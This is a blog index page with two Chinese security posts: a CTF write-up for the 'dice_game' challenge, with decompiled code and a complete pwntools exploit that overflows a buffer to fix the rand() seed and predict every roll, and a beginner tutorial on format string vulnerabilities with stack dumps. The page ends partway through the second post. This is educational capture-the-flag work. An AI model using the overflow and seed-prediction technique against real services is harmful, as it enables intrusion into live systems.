<!DOCTYPE html>





<html lang="">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 3.9.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
  <link rel="alternate" href="/atom.xml" title="ZERO-A-ONE" type="application/atom+xml">

<link rel="stylesheet" href="/css/main.css?v=7.4.0">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">


<script id="hexo-configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '7.4.0',
    exturl: false,
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
    copycode: {"enable":false,"show_result":false,"style":null},
    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
    bookmark: {"enable":false,"color":"#222","save":"auto"},
    fancybox: false,
    mediumzoom: false,
    lazyload: false,
    pangu: false,
    algolia: {
      appID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    },
    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
    path: 'search.xml',
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    translation: {
      copy_button: 'Copy',
      copy_success: 'Copied',
      copy_failure: 'Copy failed'
    },
    sidebarPadding: 40
  };
</script>

  <meta name="description" content="Resit much,Obey little">
<meta property="og:type" content="website">
<meta property="og:title" content="ZERO-A-ONE">
<meta property="og:url" content="http://yoursite.com/page/7/index.html">
<meta property="og:site_name" content="ZERO-A-ONE">
<meta property="og:description" content="Resit much,Obey little">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="ZERO-A-ONE">
<meta name="twitter:description" content="Resit much,Obey little">
  <link rel="canonical" href="http://yoursite.com/page/7/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome: true,
    isPost: false,
    isPage: false,
    isArchive: false
  };
</script>

  <title>ZERO-A-ONE</title>
  








  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="default">
  <div class="container use-motion">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">ZERO-A-ONE</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Toggle navigation bar">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
      
      
      
        
        <li class="menu-item menu-item-home">
      
    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>

  </li>
      
      
      
        
        <li class="menu-item menu-item-archives">
      
    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>

  </li>
      <li class="menu-item menu-item-search">
        <a href="javascript:;" class="popup-trigger">
        
          <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Search</a>
      </li>
    
  </ul>

</nav>
  <div class="site-search">
    <div class="popup search-popup">
    <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocorrect="off" autocapitalize="none"
           placeholder="Searching..." spellcheck="false"
           type="text" id="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result"></div>

</div>
<div class="search-pop-overlay"></div>

  </div>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
            

          <div id="content" class="content">
            
  <div id="posts" class="posts-expand">
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/01/┤╙DICE-GAME┐┤RAND║»╩²╥╘╝░SEED╡─└√╙├/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/09/01/┤╙DICE-GAME┐┤RAND║»╩²╥╘╝░SEED╡─└√╙├/" class="post-title-link" itemprop="url">从DICE_GAME看RAND函数以及SEED的利用</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-09-01 09:41:29" itemprop="dateCreated datePublished" datetime="2019-09-01T09:41:29-07:00">2019-09-01</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-09-02 00:41:58" itemprop="dateModified" datetime="2019-09-02T00:41:58-07:00">2019-09-02</time>
              </span>
            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>本题来自<strong>XCTF 4th-QCTF-2018</strong>的<strong>dice_game</strong></p>
<h2 id="伪随机数-amp-rand"><a href="#伪随机数-amp-rand" class="headerlink" title="伪随机数&amp;rand()"></a>伪随机数&amp;rand()</h2><p>伪随机数是用确定性的算法计算出来自[0,1]均匀分布的随机数序列。并不真正的随机，但具有类似于随机数的统计特征，如均匀性、独立性等。在计算伪随机数时，若使用的初值（种子）不变，那么伪随机数的数序也不变</p>
<p><code>rand</code>函数不是真正的随机数生成器，而<code>srand()</code>会设置供<code>rand()</code>使用的随机数种子。如果你在第一次调用rand()之前没有调用<code>srand()</code>，那么系统会为你自动调用<code>srand()</code>。而使用同种子相同的数调用<code>rand()</code>会导致相同的随机数序列被生成</p>
<p>我们可以知道一个简单的结论：<strong>计算机里面的随机数生成函数，使用相同的seed（种子）会得到相同的伪随机数序列</strong></p>
<h1 id="dice-game"><a href="#dice-game" class="headerlink" title="dice_game"></a>dice_game</h1><p>我们先检查一下开启了哪些保护措施</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">   RELRO:    Full RELRO</span><br><span class="line">   Stack:    No canary found</span><br><span class="line">   NX:       NX enabled</span><br><span class="line">   PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>直接打开IDA Pro检查一下反汇编代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">55</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+37h] [rbp-19h]</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> seed[<span class="number">2</span>]; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// [rsp+4Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  *(_QWORD *)seed = time(<span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Welcome, let me know your name: "</span>, a2);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  v6 = read(<span class="number">0</span>, buf, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( v6 &lt;= <span class="number">49</span> )</span><br><span class="line">    buf[v6 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hi, %s. Let's play a game.\n"</span>, buf);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  srand(seed[<span class="number">0</span>]);</span><br><span class="line">  v8 = <span class="number">1</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Game %d/50\n"</span>, v8);</span><br><span class="line">    v5 = sub_A20();</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v5 != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v8 == <span class="number">50</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_B28(buf);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Bye bye!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从<code>memset(buf, 0, 0x30uLL);</code>可以看到程序只开了0x30个，而 <code>read(0, buf, 0x50uLL);</code>却可以读取0x50个，<code>read</code>越界，而<code>buf</code>距离栈底正好0x50，所以传统思路最多只能劫持EBP，而且开启了PIE对后面的利用也是没有帮助。我们发现了<code>srand</code>函数，可以猜测这题和随机数有关系，可以知道种子即是<code>seed[0]</code>，我们寻找一下生成随机数有关的函数，我们发现了<code>sub_A20()</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">sub_A20</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int16 v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line">  __int16 v2; <span class="comment">// [rsp+Eh] [rbp-2h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Give me the point(1~6): "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%hd"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = rand() % <span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt;= <span class="number">0</span> || v1 &gt; <span class="number">6</span> || v2 &lt;= <span class="number">0</span> || v2 &gt; <span class="number">6</span> )</span><br><span class="line">      _assert_fail(<span class="string">"(point&gt;=1 &amp;&amp; point&lt;=6) &amp;&amp; (sPoint&gt;=1 &amp;&amp; sPoint&lt;=6)"</span>, <span class="string">"dice_game.c"</span>, <span class="number">0x18</span>u, <span class="string">"dice_game"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v1 == v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You win."</span>);</span><br><span class="line">      result = <span class="number">1L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You lost."</span>);</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid value!"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现当v1=v2时我们就赢了，而通过<code>v2 = rand() % 6 + 1;</code>可以发现v2就是通过随机数生成的，而v1就是我们输入的数据，函数<code>sub_A20()</code>功能就是rand一个6以内的随机数，然后用户输入一个，连续才对50次就会拿到flag，而我们知道只要确定了种子数就可以得到相同的随机序列。我们可以覆盖seed[0]，而seed[0]正好是rand的种子</p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>通过</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buf[<span class="number">55</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> seed[<span class="number">2</span>]; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br></pre></td></tr></table></figure>

<p>我们可以知道buf在栈上0-50h的位置上，而seed在栈上10h的位置上，我们知道栈是从高地址向低地址生长故栈上的分布应该是</p>
<table>
<thead>
<tr>
<th align="center">0h(rbp)</th>
<th align="center">buf</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>-10h</strong></td>
<td align="center"><strong>seed-buf</strong></td>
</tr>
<tr>
<td align="center"><strong>-20h</strong></td>
<td align="center"><strong>buf</strong></td>
</tr>
<tr>
<td align="center"><strong>-30h</strong></td>
<td align="center"><strong>buf</strong></td>
</tr>
<tr>
<td align="center"><strong>-40h</strong></td>
<td align="center"><strong>buf</strong></td>
</tr>
<tr>
<td align="center"><strong>-50h</strong></td>
<td align="center"><strong>buf</strong></td>
</tr>
</tbody></table>
<p>我们来看seed和buf的交界处</p>
<table>
<thead>
<tr>
<th align="center">-7h</th>
<th align="center">buf</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>-8h</strong></td>
<td align="center"><strong>buf</strong></td>
</tr>
<tr>
<td align="center"><strong>-9h</strong></td>
<td align="center"><strong>seed[1]</strong></td>
</tr>
<tr>
<td align="center"><strong>-10h</strong></td>
<td align="center"><strong>seed[0]</strong></td>
</tr>
<tr>
<td align="center"><strong>-11h</strong></td>
<td align="center"><strong>buf</strong></td>
</tr>
</tbody></table>
<p>可知，当我们填充0x40个字符时，再填充的一个字符就是<code>seed[0]</code>，故我们可以确定<code>seed[0]</code>的值，我们就确定为0，exploit应该为<code>&#39;a&#39;*0x40 + p64(0)</code></p>
<p>现在我们知道了随机数的种子数为0，就可以构造相同的随机数列就行爆破，我们还知道<code>v2 = rand() % 6 + 1</code></p>
<p>完整的exploit如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">"libc.so.6"</span>)</span><br><span class="line">res = []<span class="comment">#随机数序列</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dice_game</span><span class="params">()</span>:</span><span class="comment">#生成随机数序列</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">        rand = libc.rand()</span><br><span class="line">        res.append(rand % <span class="number">6</span> + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">print</span> res</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./dice_game'</span>)</span><br><span class="line">dice_game()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x40</span> + p64(<span class="number">0</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"your name: "</span>, payload)</span><br><span class="line"><span class="keyword">for</span> point <span class="keyword">in</span> res:</span><br><span class="line">    p.sendlineafter(<span class="string">"point(1~6): "</span>, str(point))</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">flag = p.recvline()</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>


        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/13/╨┬╩╓╧≥í¬í¬╟│╠╕╕±╩╜╗»╫╓╖√┤«╝░╞Σ─┌┤µ═╝└²ú¿╥╗ú⌐/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/08/13/╨┬╩╓╧≥í¬í¬╟│╠╕╕±╩╜╗»╫╓╖√┤«╝░╞Σ─┌┤µ═╝└²ú¿╥╗ú⌐/" class="post-title-link" itemprop="url">新手向——浅谈格式化字符串及其内存图例（一）</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-08-13 07:03:14 / Modified: 22:03:32" itemprop="dateCreated datePublished" datetime="2019-08-13T07:03:14-07:00">2019-08-13</time>
            </span>
          
            

            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <blockquote>
<p>“一切安全问题的起源都是冯·诺依曼结构。”——NULL</p>
</blockquote>
<p>本新手向文章第一部分以32位系统为例</p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>格式化字符串漏洞在通用漏洞类型库CWE中的编号是134，其解释为“软件使用了格式化字符串作为参数，且该格式化字符串来自外部输入”。会触发该漏洞的函数很有限，主要就是<code>printf</code>、<code>sprintf</code>、<code>fprintf</code>等<code>print</code>家族函数。常见的有格式化字符串函数有：</p>
<ul>
<li>输入<ul>
<li>scanf</li>
</ul>
</li>
<li>输出</li>
</ul>
<table>
<thead>
<tr>
<th>函数</th>
<th>基本介绍</th>
</tr>
</thead>
<tbody><tr>
<td>printf</td>
<td>输出到 stdout</td>
</tr>
<tr>
<td>fprintf</td>
<td>输出到指定 FILE 流</td>
</tr>
<tr>
<td>vprintf</td>
<td>根据参数列表格式化输出到 stdout</td>
</tr>
<tr>
<td>vfprintf</td>
<td>根据参数列表格式化输出到指定 FILE 流</td>
</tr>
<tr>
<td>sprintf</td>
<td>输出到字符串</td>
</tr>
<tr>
<td>snprintf</td>
<td>输出指定字节数到字符串</td>
</tr>
<tr>
<td>vsprintf</td>
<td>根据参数列表格式化输出到字符串</td>
</tr>
<tr>
<td>vsnprintf</td>
<td>根据参数列表格式化输出指定字节到字符串</td>
</tr>
<tr>
<td>setproctitle</td>
<td>设置 argv</td>
</tr>
<tr>
<td>syslog</td>
<td>输出日志</td>
</tr>
<tr>
<td>err, verr, warn, vwarn 等</td>
<td>。。。</td>
</tr>
</tbody></table>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>首先我们来看看一个普通的<code>printf</code>函数格式化字符串在栈中的存储结构</p>
<table>
<thead>
<tr>
<th align="center">高地址</th>
</tr>
</thead>
<tbody><tr>
<td align="center">……</td>
</tr>
<tr>
<td align="center">argv[3]</td>
</tr>
<tr>
<td align="center">argv[2]</td>
</tr>
<tr>
<td align="center">argv[1]</td>
</tr>
<tr>
<td align="center">Format String</td>
</tr>
<tr>
<td align="center">ESP（EIP）</td>
</tr>
<tr>
<td align="center">低地址</td>
</tr>
</tbody></table>
<p>不难看出对于<code>printf</code>函数，格式化字符串本身就是第一个参数</p>
<p>例如这样的程序</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"%d %s %s"</span>,<span class="number">12</span>,<span class="string">"abc"</span>,<span class="string">"Hellow"</span>);</span><br></pre></td></tr></table></figure>

<p>那么对应的内存地址应该是这样的</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffce3c —▸ 0x8048432 (main+39) ◂— add    esp, 0x10</span><br><span class="line">01:0004│      0xffffce40 —▸ 0x80484db ◂— and    eax, 0x73252064 /* '%d %s %s' */</span><br><span class="line">02:0008│      0xffffce44 ◂— 0xc /* '\x0c' */</span><br><span class="line">03:000c│      0xffffce48 —▸ 0x80484d7 ◂— popal   /* 'abc' */</span><br><span class="line">04:0010│      0xffffce4c —▸ 0x80484d0 ◂— dec    eax /* 'Hellow' */</span><br><span class="line">05:0014│      0xffffce50 —▸ 0xf7fb43dc (__exit_funcs) —▸ 0xf7fb51e0 (initial) ◂— 0x0</span><br><span class="line">06:0018│      0xffffce54 —▸ 0xffffce70 ◂— 0x1</span><br><span class="line">07:001c│ ebp  0xffffce58 ◂— 0x0</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">高地址</th>
<th align="center"></th>
</tr>
</thead>
<tbody><tr>
<td align="center">……</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">argv[2]</td>
<td align="center">‘Hellow’</td>
</tr>
<tr>
<td align="center">argv[2]</td>
<td align="center">‘abc’</td>
</tr>
<tr>
<td align="center">argv[1]</td>
<td align="center">‘\x0c’</td>
</tr>
<tr>
<td align="center">Format String</td>
<td align="center">‘%d %s %s’</td>
</tr>
<tr>
<td align="center">ESP（EIP）</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">低地址</td>
<td align="center"></td>
</tr>
</tbody></table>
<p>正如我之前所写的代码，我们一般会规定<code>printf</code>参数的个数加以限制，完整的程序会类似这样</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> n=<span class="number">5</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%d"</span>,n);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但也有人会懒省事，写成这样：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> a[]=<span class="string">"neuqcsa"</span>;</span><br><span class="line">  <span class="built_in">printf</span>(a);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实参与函数形参的结合顺序是从左往右依次进行的，所以上面的代码也能输出<code>neuqcsa</code>，而此时的内存结构为</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffce2c —▸ 0x80484a1 (main+54) ◂— add    esp, 0x10</span><br><span class="line">01:0004│      0xffffce30 —▸ 0xffffce44 ◂— 'neuqcsa'</span><br><span class="line">02:0008│      0xffffce34 ◂— 0x0</span><br><span class="line">03:000c│      0xffffce38 —▸ 0xf7e30a50 (__new_exitfn+16) ◂— add    ebx, 0x1835b0</span><br><span class="line">04:0010│      0xffffce3c —▸ 0x804851b (__libc_csu_init+75) ◂— add    edi, 1</span><br><span class="line">05:0014│      0xffffce40 ◂— 0x1</span><br><span class="line">06:0018│ eax  0xffffce44 ◂— 'neuqcsa'</span><br><span class="line">07:001c│      0xffffce48 ◂— 0x617363 /* 'csa' */</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">高地址</th>
<th align="center"></th>
</tr>
</thead>
<tbody><tr>
<td align="center">……</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">argv[2]</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">argv[2]</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">argv[1]</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">Format String</td>
<td align="center">‘neuqcsa’</td>
</tr>
<tr>
<td align="center">ESP（EIP）</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">低地址</td>
